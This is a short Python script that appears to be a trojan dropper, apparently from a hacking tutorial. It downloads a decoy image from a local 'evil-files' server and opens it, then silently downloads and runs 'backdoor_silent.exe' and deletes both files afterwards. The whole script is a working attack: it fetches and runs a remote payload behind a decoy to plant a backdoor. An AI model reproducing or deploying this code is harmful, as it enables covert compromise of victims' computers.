#!/usr/bin/env python
import requests, subprocess, os, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

temp_file = tempfile.gettempdir()
os.chdir(temp_file)

download("http://192.168.0.104/evil-files/kratos.jpg")#add direct link to image
subprocess.Popen("kratos.jpg",shell=True)

download("http://192.168.0.104/evil-files/backdoor_silent.exe")#add direct link to payload
subprocess.call("backdoor_silent.exe", shell=True)
 
os.remove("kratos.jpg")
os.remove("backdoor_silent.exe")